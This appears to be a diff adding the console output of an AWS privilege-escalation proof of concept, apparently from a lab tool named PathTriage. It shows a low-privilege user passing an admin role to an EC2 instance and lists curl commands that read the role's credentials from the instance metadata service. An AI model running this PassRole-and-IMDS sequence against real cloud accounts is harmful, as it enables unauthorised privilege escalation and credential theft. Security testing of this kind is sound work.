@@ -1,0 +1,37 @@
+/Users/moonhyeon/Library/Python/3.9/lib/python/site-packages/boto3/compat.py:89: PythonDeprecationWarning: Boto3 will no longer support Python 3.9 starting April 29, 2026. To continue receiving service updates, bug fixes, and security updates please upgrade to Python 3.10 or later. More information can be found here: https://aws.amazon.com/blogs/developer/python-support-policy-updates-for-aws-sdks-and-tools/
+  warnings.warn(warning, PythonDeprecationWarning)
+================================================================
+  PathTriage Path 01: PassRole + Service Abuse
+================================================================
+[94m[*][0m Verifying starting identity...
+[92m[+][0m Starting as: arn:aws:iam::559292738121:user/pathtriage-low-priv-attacker
+
+[94m[*][0m Enumerating passable roles...
+[92m[+][0m Found target role: pathtriage-passrole-admin-target
+    ARN: arn:aws:iam::559292738121:role/pathtriage-passrole-admin-target
+
+[94m[*][0m Finding Amazon Linux 2023 AMI...
+[92m[+][0m Using AMI: ami-05e5be36bf4f45d3d
+
+[94m[*][0m Launching EC2 instance with admin instance profile...
+[92m[+][0m Instance launched: i-0c908105c5117a626
+
+[94m[*][0m Waiting for instance to reach running state...
+[92m[+][0m Instance running. Public IP: 3.26.43.152
+
+[94m[*][0m Demonstrating IMDS credential extraction (attacker side)...
+    On the instance, the attacker would run:
+      curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+      # Returns: pathtriage-passrole-admin-target
+      curl http://169.254.169.254/latest/meta-data/iam/security-credentials/pathtriage-passrole-admin-target
+      # Returns: {AccessKeyId, SecretAccessKey, Token, Expiration}
+
+[92m[+][0m Credentials of role arn:aws:iam::559292738121:role/pathtriage-passrole-admin-target would be exposed via IMDS.
+[93m[!][0m Privilege escalation primitive confirmed.
+
+[94m[*][0m Cleaning up: terminating EC2 instance i-0c908105c5117a626...
+[92m[+][0m Cleanup complete.
+
+================================================================
+  [92m[+][0m Path 01 PoC complete.
+================================================================
